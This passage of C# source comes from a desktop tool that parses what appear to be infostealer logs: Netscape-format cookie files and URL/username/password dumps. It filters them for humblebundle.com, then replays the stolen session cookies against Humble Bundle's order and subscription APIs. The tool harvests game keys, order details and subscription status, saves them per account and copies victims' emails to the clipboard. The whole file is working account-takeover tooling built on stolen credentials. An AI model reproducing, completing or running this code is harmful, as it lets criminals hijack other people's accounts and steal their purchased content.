                    {
                        try
                        {
                            var JSON = JsonConvert.DeserializeObject<ISubscription>(SubscriptionValue);

                            if (JSON == null)
                            {
                                Logger.LogGenericWarning($"Ошибка: {SubscriptionValue}.");
                            }
                            else
                            {
                                Response.User.Subscription.Status = JSON.Status.ToUpper();
                                Response.User.Subscription.NextBillingDate = JSON.NextBillingDate;

                                #region Monthly Content

                                if (!string.IsNullOrEmpty(Response.User.Subscription.Name) &&
                                     Regex.IsMatch(Response.User.Subscription.Name, @"[0-9]+-MONTH", RegexOptions.IgnoreCase))
                                {
                                    Response.User.Subscription.MonthlyContent.Active = !JSON.Active;
                                }

                                Response.User.Subscription.MonthlyContent.Name = JSON.Name;
                                Response.User.Subscription.MonthlyContent.EndDate = JSON.EndDate;

                                #endregion

                                #region Pause

                                Response.User.Subscription.Pause.Enabled = JSON.Enabled;
                                Response.User.Subscription.Pause.LastSkipped = JSON.LastSkipped;
                                Response.User.Subscription.Pause.ResumeDate = JSON.ResumeDate;

                                #endregion
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }
                    else
                    {
                        Logger.LogGenericWarning($"Ошибка: {SubscriptionValue}");
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return Response;
        }

        #region Exchange

        public class IExchange
        {
            public class INavbar
            {
                public class ISearch
                {
                    public class IConstant
                    {
                        [JsonProperty("pricing_currency")]
                        public string Currency { get; set; }

                        public class IValues
                        {
                            public double USD { get; set; }
                            public double AUD { get; set; }
                            public double CHF { get; set; }
                            public double IDR { get; set; }
                            public double KRW { get; set; }
                            public double BGN { get; set; }
                            public double CNY { get; set; }
                            public double ISK { get; set; }
                            public double ILS { get; set; }
                            public double GBP { get; set; }
                            public double NZD { get; set; }
                            public double DKK { get; set; }
                            public double CAD { get; set; }
                            public double TRY { get; set; }
                            public double HUF { get; set; }
                            public double PHP { get; set; }
                            public double RON { get; set; }
                            public double NOK { get; set; }
                            public double RUB { get; set; }
                            public double ZAR { get; set; }
                            public double MYR { get; set; }
                            public double INR { get; set; }
                            public double THB { get; set; }
                            public double MXN { get; set; }
                            public double CZK { get; set; }
                            public double BRL { get; set; }
                            public double JPY { get; set; }
                            public double PLN { get; set; }
                            public double EUR { get; set; }
                            public double SEK { get; set; }
                            public double SGD { get; set; }
                            public double HKD { get; set; }
                        }

                        [JsonProperty("exchange_rates")]
                        public IValues Values { get; set; }
                    }

                    [JsonProperty("pricing_constants")]
                    public IConstant Constant { get; set; }
                }

                [JsonProperty("searchOptions")]
                public ISearch Search { get; set; }
            }

            [JsonProperty("navbar")]
            public INavbar Navbar { get; set; }
        }

        #endregion

        private IHumbleBundleResponse IHumbleBundleExchange(IHumbleBundleResponse Response, Logger Logger, string Content)
        {
            try
            {
                string ExchangeValue = GetSplitValue(Content, new ISplit
                {
                    Start = "<script id=\"base-webpack-json-data\" type=\"application/json\">",
                    StartValue = 1,
                    End = "</script>",
                    EndValue = 0
                });

                if (string.IsNullOrEmpty(ExchangeValue))
                {
                    Logger.LogGenericWarning("Ответ пуст!");
                }
                else
                {
                    if (Logger.Helper.IsValidJson(ExchangeValue))
                    {
                        try
                        {
                            var JSON = JsonConvert.DeserializeObject<IExchange>(ExchangeValue);

                            if (JSON == null)
                            {
                                Logger.LogGenericWarning($"Ошибка: {ExchangeValue}.");
                            }
                            else
                            {
                                if (JSON.Navbar == null || JSON.Navbar.Search == null || JSON.Navbar.Search.Constant == null || JSON.Navbar.Search.Constant.Values == null)
                                {
                                    return Response;
                                }

                                var Constant = JSON.Navbar.Search.Constant;

                                var Exchange = Constant.Values
                                    .GetType()
                                    .GetProperties(BindingFlags.Instance | BindingFlags.Public)
                                    .ToDictionary(x => x.Name, x => (double)x.GetValue(Constant.Values, null));

                                if (string.IsNullOrEmpty(Constant.Currency))
                                {
                                    Response.Exchange = Exchange;
                                }
                                else
                                {
                                    Response.Exchange = Exchange
                                        .Where(x => x.Key == "RUB" || x.Key == Constant.Currency)
                                        .ToDictionary(x => x.Key, x => x.Value);
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }
                    else
                    {
                        Logger.LogGenericWarning($"Ошибка: {ExchangeValue}");
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return Response;
        }

        private async Task<IHumbleBundleResponse> IHumbleBundleUser(IHumbleBundleResponse Response, ILog.ICookie List, Logger Logger)
        {
            try
            {
                var Client = new RestClient(
                    new RestClientOptions()
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                        MaxTimeout = 300000
                    });

                var Request = new RestRequest("https://www.humblebundle.com/api/v1/user/order");

                try
                {
                    Client.AddCookie(List.Name, List.Value, List.Path, List.Domain);
                }
                catch { }

                try
                {
                    for (byte i = 0; i < 10; i++)
                    {
                        var Source = new CancellationTokenSource();
                        Source.CancelAfter(300000);

                        try
                        {
                            var Execute = await Client.ExecuteGetAsync(Request, Source.Token);

                            if ((int)Execute.StatusCode == 429)
                            {
                                Logger.LogGenericWarning("Слишком много запросов!");

                                await Task.Delay(TimeSpan.FromMinutes(2.5), Source.Token);

                                continue;
                            }

                            if (string.IsNullOrEmpty(Execute.Content))
                            {
                                if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                {
                                    Logger.LogGenericWarning("Ответ пуст!");

                                    await Task.Delay(TimeSpan.FromMinutes(1));

                                    continue;
                                }
                                else
                                {
                                    Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                }
                            }
                            else
                            {
                                if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                {
                                    if (Logger.Helper.IsValidJson(Execute.Content))
                                    {
                                        try
                                        {
                                            var JSON = JsonConvert.DeserializeObject<List<IHumbleBundleResponse.IGameKeyList>>(Execute.Content);

                                            if (JSON == null)
                                            {
                                                Logger.LogGenericWarning($"Ошибка: {Execute.Content}.");
                                            }
                                            else
                                            {
                                                Response.GameKeyList = JSON
                                                    .Select(x => x.GameKey)
                                                    .ToList();
                                            }

                                            break;
                                        }
                                        catch (Exception e)
                                        {
                                            Logger.LogGenericException(e);
                                        }
                                    }
                                    else
                                    {
                                        Logger.LogGenericWarning($"Ошибка: {Execute.Content}");
                                    }
                                }
                                else
                                {
                                    Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                }
                            }

                            await Task.Delay(2500);
                        }
                        catch (OperationCanceledException)
                        {
                            Logger.LogGenericDebug("Задача успешно отменена!");
                        }
                        catch (ObjectDisposedException) { }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                        finally
                        {
                            Source.Dispose();
                            Source = null;
                        }
                    }
                }
                catch (OperationCanceledException)
                {
                    Logger.LogGenericDebug("Задача успешно отменена!");
                }
                catch (ObjectDisposedException) { }
                catch (Exception e)
                {
                    Logger.LogGenericException(e);
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return Response;
        }

        private async Task<IHumbleBundleResponse> IHumbleBundleOrder(IHumbleBundleResponse Response, ILog.ICookie List, Logger Logger)
        {
            try
            {
                foreach (var (Key, Index) in Response.GameKeyList
                    .Select((x, i) => (Value: x, Index: i += 1))
                    .ToList())
                {
                    try
                    {
                        var Client = new RestClient(
                            new RestClientOptions()
                            {
                                UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                                MaxTimeout = 300000
                            });

                        var Request = new RestRequest($"https://www.humblebundle.com/api/v1/order/{Key}?all_tpkds=true");

                        try
                        {
                            Client.AddCookie(List.Name, List.Value, List.Path, List.Domain);
                        }
                        catch { }

                        try
                        {
                            for (byte i = 0; i < 10; i++)
                            {
                                var Source = new CancellationTokenSource();
                                Source.CancelAfter(300000);

                                try
                                {
                                    var Execute = await Client.ExecuteGetAsync(Request, Source.Token);

                                    if ((int)Execute.StatusCode == 429)
                                    {
                                        Logger.LogGenericWarning("Слишком много запросов!");

                                        await Task.Delay(TimeSpan.FromMinutes(2.5), Source.Token);

                                        continue;
                                    }

                                    if (string.IsNullOrEmpty(Execute.Content))
                                    {
                                        if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                        {
                                            Logger.LogGenericWarning("Ответ пуст!");

                                            await Task.Delay(TimeSpan.FromMinutes(1));

                                            continue;
                                        }
                                        else
                                        {
                                            Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                        }
                                    }
                                    else
                                    {
                                        if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                                        {
                                            if (Logger.Helper.IsValidJson(Execute.Content))
                                            {
                                                try
                                                {
                                                    var JSON = JsonConvert.DeserializeObject<IHumbleBundleResponse.IOrder>(Execute.Content);

                                                    if (JSON == null)
                                                    {
                                                        Logger.LogGenericWarning($"Ошибка: {Execute.Content}.");
                                                    }
                                                    else
                                                    {
                                                        Logger.LogGenericDebug($"ORDER <- {Index}/{Response.GameKeyList.Count}: {JsonConvert.SerializeObject(JSON)}");

                                                        if (Response.OrderList == null)
                                                            Response.OrderList = new List<IHumbleBundleResponse.IOrder>();

                                                        JSON._ = Execute.Content;

                                                        Response.OrderList.Add(JSON);
                                                    }

                                                    break;
                                                }
                                                catch (Exception e)
                                                {
                                                    if (!e.Message.Contains("Unexpected character encountered while parsing value"))
                                                    {
                                                        Logger.LogGenericException(e);
                                                    }
                                                }
                                            }
                                            else
                                            {
                                                Logger.LogGenericWarning($"Ошибка: {Execute.Content}");
                                            }
                                        }
                                        else
                                        {
                                            Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                                        }
                                    }

                                    await Task.Delay(2500);
                                }
                                catch (OperationCanceledException)
                                {
                                    Logger.LogGenericDebug("Задача успешно отменена!");
                                }
                                catch (ObjectDisposedException) { }
                                catch (Exception e)
                                {
                                    Logger.LogGenericException(e);
                                }
                                finally
                                {
                                    Source.Dispose();
                                    Source = null;
                                }
                            }
                        }
                        catch (OperationCanceledException)
                        {
                            Logger.LogGenericDebug("Задача успешно отменена!");
                        }
                        catch (ObjectDisposedException) { }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }

                    await Task.Delay(Helper.Next(1000, 2500));
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return Response;
        }

        #endregion

        #region Helper

        public class Append
        {
            private static readonly SemaphoreSlim Semaphore = new SemaphoreSlim(1, 1);

            public static async Task File(Logger Logger, string DirectoryValue, string FileValue, string Content, [CallerMemberName] string MethodName = null)
            {
                if (!Directory.Exists(DirectoryValue)) Directory.CreateDirectory(DirectoryValue);

                await Semaphore.WaitAsync().ConfigureAwait(false);

                Logger.LogGenericDebug($"SAVE <- {DirectoryValue}\\{FileValue}", MethodName);

                try
                {
                    System.IO.File.AppendAllText(
                        Path.Combine(DirectoryValue, FileValue),
                        Content);
                }
                catch (Exception e)
                {
                    Logger.LogGenericException(e);
                }
                finally
                {
                    Semaphore.Release();
                }
            }

            public static string Range(int Value)
            {
                if (Value > 0)
                {
                    var Dictionary = new Dictionary<int, int>
                    {
                        #region >= | <=

                        { 1, 100 },
                        { 101, 200 },

                        { 201, 400 },
                        { 401, 600 },
                        { 601, 800 },
                        { 801, 1000 }

                        #endregion
                    };

                    foreach (var Pair in Dictionary)
                    {
                        if (Value >= Pair.Key &&
                            Value <= Pair.Value)
                        {
                            return $"{Pair.Key}-{(Pair.Value == 0x7FFFFFFF ? "∞" : $"{Pair.Value}")}";
                        }
                    }
                }

                return "";
            }

            public static string Content(List<string> List)
            {
                string _ = "============================================================================================================================================================================================================";

                return $"{string.Join("\n", List)}\n\r{_}\n\r";
            }
        }

        private List<string> GetPasswordList(List<ILog.IPasswordList> PasswordList)
        {
            var List = PasswordList
                .Select(x => $"{x.URL} - {x.Username} - {x.Password}")
                .Distinct()
                .ToList();

            if (List.Count > 0)
            {
                return List;
            }

            return null;
        }

        private string GetFileName(List<string> List)
        {
            if (List.Count == 0)
            {
                List.Add("EMPTY");
            }

            return string.Join(" - ", List);
        }

        private static string Combine(string First, params string[] PS)
        {
            string _ = First;

            foreach (string X in PS)
            {
                _ = Path.Combine(_, X);
            }

            if (!Directory.Exists(_)) Directory.CreateDirectory(_);

            return _;
        }

        public class ISplit
        {
            public string Start { get; set; }
            public byte StartValue { get; set; }
            public string End { get; set; }
            public byte EndValue { get; set; }
        }

        private static string GetSplitValue(string Content, ISplit Split)
        {
            if (!string.IsNullOrEmpty(Content))
            {
                string[] Start = Content.Split(new[] { Split.Start }, StringSplitOptions.RemoveEmptyEntries);

                if (Start.Length > Split.StartValue)
                {
                    string[] End = Start[1].Split(new[] { Split.End }, StringSplitOptions.RemoveEmptyEntries);

                    if (End.Length > Split.EndValue)
                    {
                        return End[Split.EndValue];
                    }
                }
            }

            return "";
        }

        #region Cookie

        private List<ILog.ICookie> GetCookieLine(string File)
        {
            try
            {
                string Lines = System.IO.File.ReadAllText(File);

                if (!string.IsNullOrEmpty(Lines))
                {
                    var Match = Regex.Match(Lines.Replace("\r", ""), @"	\/	(FALSE|TRUE)");

                    if (Match.Success)
                    {
                        string[] Array = Lines
                            .Replace("\r", "")
                            .Split(new[] { "\n" }, StringSplitOptions.RemoveEmptyEntries);

                        if (Array.Length > 0)
                        {
                            var Cookies = new List<ILog.ICookie>();

                            foreach (string Value in Array)
                            {
                                var Cookie = GetCookie(Value);

                                if (Cookie == null) continue;

                                Cookies.Add(Cookie);
                            }

                            return Cookies;
                        }
                    }
                }
            }
            catch (Exception e)
            {
                if (!e.Message.Contains("Operation did not complete successfully because the file contains a virus or potentially unwanted software."))
                {
                    Logger.LogGenericException(e);
                }
            }

            return null;
        }

        private ILog.ICookie GetCookie(string Value)
        {
            try
            {
                string[] Cookie = Value.Split('\t');

                if (Cookie.Length == 7)
                {
                    if (!string.IsNullOrEmpty(Cookie[0]) &&
                        !string.IsNullOrEmpty(Cookie[5]) &&
                        !string.IsNullOrEmpty(Cookie[6]))
                    {
                        if (Cookie[0].Contains("humblebundle.com"))
                        {
                            var X = new ILog.ICookie
                            {
                                Domain = Cookie[0],
                                HttpOnly = Cookie[1] == "TRUE",
                                Path = Cookie[2],
                                Secure = Cookie[3] == "TRUE",
                                Name = Cookie[5],
                                Value = Cookie[6]
                            };

                            if (!(string.IsNullOrEmpty(Cookie[4]) || Cookie[4] == null || Cookie[4] == "FALSE"))
                            {
                                X.ExpirationDate = Helper.GetDoubleValue(Cookie[4]);
                            }

                            return X;
                        }
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return null;
        }


        #endregion

        private List<ILog.IPasswordList> GetPasswordLine(string File)
        {
            try
            {
                string Lines = System.IO.File.ReadAllText(File);

                if (!string.IsNullOrEmpty(Lines))
                {
                    var Password = new List<ILog.IPasswordList>();

                    var Matches = Regex.Matches(Lines.Replace("\r", ""),
                        @"URL: (.+)\n(?:USERNAME|LOGIN): (.+)\nPASSWORD: (.+)",
                        RegexOptions.IgnoreCase);

                    foreach (Match Match in Matches)
                    {
                        try
                        {
                            if (Match.Success &&
                                Match.Groups.Count > 3)
                            {
                                if (Match.Groups[1].Success &&
                                    Match.Groups[2].Success &&
                                    Match.Groups[3].Success)
                                {
                                    if (Match.Groups[1].Value.Contains("humblebundle.com"))
                                    {
                                        Password.Add(new ILog.IPasswordList
                                        {
                                            URL = Match.Groups[1].Value,
                                            Username = Match.Groups[2].Value,
                                            Password = Match.Groups[3].Value
                                        });
                                    }
                                }
                            }
                        }
                        catch (Exception e)
                        {
                            Logger.LogGenericException(e);
                        }
                    }

                    return Password;
                }
            }
            catch (Exception e)
            {
                if (!e.Message.Contains("Operation did not complete successfully because the file contains a virus or potentially unwanted software."))
                {
                    Logger.LogGenericException(e);
                }
            }

            return null;
        }

        #endregion

        #region Sort

        private void Sort_Click(object sender, RoutedEventArgs e) => Sort();

        private void Sort()
        {
            var CommonOpenFileDialog = new CommonOpenFileDialog
            {
                IsFolderPicker = true,
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (CommonOpenFileDialog.ShowDialog() == CommonFileDialogResult.Ok)
            {
                Auto.Helper.Sort.DirectoryValue = null;
                Auto.Helper.Sort.Primary.Clear();

                try
                {
                    Auto.Helper.Sort.DirectoryValue = CommonOpenFileDialog.FileName;

                    string[] FileList = Directory.GetFiles(Auto.Helper.Sort.DirectoryValue, "*", SearchOption.TopDirectoryOnly);

                    foreach (string FileValue in FileList)
                    {
                        if (File.Exists(FileValue))
                        {
                            Auto.Helper.Sort.Primary.Add(FileValue);
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.LogGenericException(e);
                }
            }
        }

        #endregion

        #region Unite

        private void Unite_Click(object sender, RoutedEventArgs e) => Unite();

        private void Unite()
        {
            var CommonOpenFileDialog = new CommonOpenFileDialog
            {
                IsFolderPicker = true,
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (CommonOpenFileDialog.ShowDialog() == CommonFileDialogResult.Ok)
            {
                Auto.Helper.Unite.DirectoryValue = null;
                Auto.Helper.Unite.Primary.Clear();

                try
                {
                    Auto.Helper.Unite.DirectoryValue = CommonOpenFileDialog.FileName;

                    string[] FileList = Directory.GetFiles(Auto.Helper.Unite.DirectoryValue, "*", SearchOption.TopDirectoryOnly);

                    foreach (string FileValue in FileList)
                    {
                        if (File.Exists(FileValue))
                        {
                            Auto.Helper.Unite.Primary.Add(FileValue);
                        }
                    }
                }
                catch (Exception e)
                {
                    Logger.LogGenericException(e);
                }
            }
        }

        #endregion

        #region App

        public class IApp
        {
            [JsonProperty]
            public Dictionary<uint, string> Result { get; set; }

            [JsonProperty]
            public string Message { get; set; }

            [JsonProperty]
            public bool Success { get; set; }
        }

        private static async Task<Dictionary<uint, string>> GetApp(IConfig.IASF ASF, string Index)
        {
            try
            {
                var Client = new RestClient(
                    new RestClientOptions()
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                        MaxTimeout = 300000
                    });

                var Request = new RestRequest($"{ASF.IP}/Api/Annex/{Index}/App");

                if (!string.IsNullOrEmpty(ASF.Password))
                {
                    Request.AddHeader("Authentication", ASF.Password);
                }

                for (byte i = 0; i < 3; i++)
                {
                    try
                    {
                        var Execute = await Client.ExecuteGetAsync(Request);

                        if ((int)Execute.StatusCode == 429)
                        {
                            await Task.Delay(TimeSpan.FromMinutes(2.5));
                        }

                        if (string.IsNullOrEmpty(Execute.Content))
                        {
                            if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                            {
                                Logger.LogGenericWarning("Ответ пуст!");
                            }
                            else
                            {
                                Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                            }
                        }
                        else
                        {
                            if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                            {
                                if (Logger.Helper.IsValidJson(Execute.Content))
                                {
                                    try
                                    {
                                        var JSON = JsonConvert.DeserializeObject<IApp>(Execute.Content);

                                        if (JSON == null)
                                        {
                                            Logger.LogGenericWarning($"Ошибка: {Execute.Content}.");
                                        }
                                        else
                                        {
                                            if (JSON.Success)
                                            {
                                                return JSON.Result;
                                            }
                                            else
                                            {
                                                Logger.LogGenericWarning($"Ошибка: {JSON.Message}");
                                            }
                                        }

                                        break;
                                    }
                                    catch (Exception e)
                                    {
                                        Logger.LogGenericException(e);
                                    }
                                }
                                else
                                {
                                    Logger.LogGenericWarning($"Ошибка: {Execute.Content}");
                                }
                            }
                            else
                            {
                                Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                            }
                        }

                        await Task.Delay(2500);
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return null;
        }

        #endregion

        #region Package

        public class IPackage
        {
            [JsonProperty]
            public List<uint> Result { get; set; }

            [JsonProperty]
            public string Message { get; set; }

            [JsonProperty]
            public bool Success { get; set; }
        }

        private static async Task<List<uint>> GetPackage(IConfig.IASF ASF, string Index)
        {
            try
            {
                var Client = new RestClient(
                    new RestClientOptions()
                    {
                        UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
                        MaxTimeout = 300000
                    });

                var Request = new RestRequest($"{ASF.IP}/Api/Annex/{Index}/Package");

                if (!string.IsNullOrEmpty(ASF.Password))
                {
                    Request.AddHeader("Authentication", ASF.Password);
                }

                for (byte i = 0; i < 3; i++)
                {
                    try
                    {
                        var Execute = await Client.ExecuteGetAsync(Request);

                        if ((int)Execute.StatusCode == 429)
                        {
                            await Task.Delay(TimeSpan.FromMinutes(2.5));
                        }

                        if (string.IsNullOrEmpty(Execute.Content))
                        {
                            if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                            {
                                Logger.LogGenericWarning("Ответ пуст!");
                            }
                            else
                            {
                                Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                            }
                        }
                        else
                        {
                            if (Execute.StatusCode == 0 || Execute.StatusCode == HttpStatusCode.OK)
                            {
                                if (Logger.Helper.IsValidJson(Execute.Content))
                                {
                                    try
                                    {
                                        var JSON = JsonConvert.DeserializeObject<IPackage>(Execute.Content);

                                        if (JSON == null)
                                        {
                                            Logger.LogGenericWarning($"Ошибка: {Execute.Content}.");
                                        }
                                        else
                                        {
                                            if (JSON.Success)
                                            {
                                                return JSON.Result;
                                            }
                                            else
                                            {
                                                Logger.LogGenericWarning($"Ошибка: {JSON.Message}");
                                            }
                                        }

                                        break;
                                    }
                                    catch (Exception e)
                                    {
                                        Logger.LogGenericException(e);
                                    }
                                }
                                else
                                {
                                    Logger.LogGenericWarning($"Ошибка: {Execute.Content}");
                                }
                            }
                            else
                            {
                                Logger.LogGenericWarning($"Ошибка: {Execute.StatusCode}.");
                            }
                        }

                        await Task.Delay(2500);
                    }
                    catch (Exception e)
                    {
                        Logger.LogGenericException(e);
                    }
                }
            }
            catch (Exception e)
            {
                Logger.LogGenericException(e);
            }

            return null;
        }

        #endregion

        private void Type_Click(object sender, RoutedEventArgs e)
        {
            switch (Auto.Type.Value)
            {
                case IAuto.EType.Check:
                    Auto.Type.Value = IAuto.EType.Sort;

                    break;
                case IAuto.EType.Sort:
                    Auto.Type.Value = string.IsNullOrEmpty(Auto.Config.Log)
                        ? IAuto.EType.Check
                        : IAuto.EType.History;

                    break;
                case IAuto.EType.History:
                    Auto.Type.Value = File.Exists(BinFile) && File.ReadAllLines(BinFile).Length > 0
                        ? IAuto.EType.Bin
                        : IAuto.EType.Check;

                    break;
                case IAuto.EType.Bin:
                    Auto.Type.Value = IAuto.EType.Check;

                    break;
            }
        }

        private void WhiteList_Click(object sender, RoutedEventArgs e)
        {
            var Add = new Add(Auto.Config.WhiteList)
            {
                Owner = this
            };

            if (Add.ShowDialog() ?? false)
            {
                uint AppID = 0;

                Auto.Config.WhiteList = Add.Auto.Collection
                    .Where(x => uint.TryParse(x.Key, out AppID) && AppID > 0)
                    .Select(x => AppID)
                    .ToList();
            }
        }

        private void AccountList_Click(object sender, RoutedEventArgs e)
        {
            var Add = new Add(Auto.Config.AccountList)
            {
                Owner = this
            };

            if (Add.ShowDialog() ?? false)
            {
                Auto.Config.AccountList = Add.Auto.Collection.ToDictionary(x => x.Key, x => new IConfig.IASF { IP = x.IP, Password = x.Password });
            }
        }

        private void GetHistory_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(Auto.Config.Log) || !Directory.Exists(Auto.Config.Log))
                {
                    Logger.LogGenericWarning("Директория с логами не существует!");

                    return;
                }

                string DirectoryValue = Combine(Auto.Config.Log, "Humble Bundle (History)", "SAVE");

                if (!Directory.Exists(DirectoryValue))
                {
                    Logger.LogGenericWarning("Директория с историей не существует!");

                    return;
                }

                var UserList = Directory
                    .GetDirectories(DirectoryValue, "*", SearchOption.TopDirectoryOnly)
                    .Select(x =>
                    {
                        string FileValue = Path.Combine(x, "!", "!.json");

                        if (File.Exists(FileValue))
                        {
                            var JSON = JsonConvert.DeserializeObject<IHumbleBundleResponse>(File.ReadAllText(FileValue));

                            if (JSON != null &&
                                JSON.User != null &&
                                JSON.User.Subscription.Code == 3 &&
                                JSON.User.Subscription.MonthlyContent.Name.ToUpper() == $"{CultureInfo.CurrentCulture.DateTimeFormat.GetMonthName(DateTime.Now.Month - 1).ToUpper()}_{DateTime.Now.Year}_CHOICE")
                            {
                                return JSON.User;
                            }
                        }

                        return null;
                    })
                    .Where(x => x != null)
                    .OrderBy(x => x.Subscription.NextBillingDate)
                    .OrderByDescending(x => x.Subscription.MonthlyContent.Active)
                    .ToList();

                if (UserList.Count > 0)
                {
                    var Thread = new Thread(() => Clipboard.SetText(string.Join("\n", UserList.Select(x => $"{x.Default.EMail}{(x.Subscription.ShouldSerializeName() ? $" ({x.Subscription.Name})" : "")} | {(x.Subscription.MonthlyContent.Active ? "MONTHLY ACTIVE CONTENT" : $"{x.Subscription.MonthlyContent.EndDate:yyyy-MM-dd} < {x.Subscription.MonthlyContent.Name.ToUpper()} > {x.Subscription.NextBillingDate:yyyy-MM-dd}")}"))));

                    Thread.SetApartmentState(ApartmentState.STA);
                    Thread.Start();
                    Thread.Join();

                    Logger.LogGenericInfo("История была скопированна в буфер обмена!");
                }
                else
                {
                    Logger.LogGenericWarning("В директории с историей нет подходящих файлов!");

                    return;
                }
            }
            catch (Exception ex)
            {
                Logger.LogGenericException(ex);
            }
        }

        private void SetHistory_Click(object sender, RoutedEventArgs e)
        {
            var CommonOpenFileDialog = new CommonOpenFileDialog
            {
                IsFolderPicker = true,
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };

            if (CommonOpenFileDialog.ShowDialog() == CommonFileDialogResult.Ok)
            {
                Auto.Config.Log = null;

                try
                {
                    Auto.Config.Log = CommonOpenFileDialog.FileName;
                }
                catch (Exception ex)
                {
                    Logger.LogGenericException(ex);
                }
            }
        }

        private void MetroWindow_PreviewKeyDown(object sender, KeyEventArgs e)
        {
            switch (e.Key)
            {
                case Key.Escape:
                    Auto.Summary.Show = !Auto.Summary.Show;

                    break;
            }
        }
    }
}
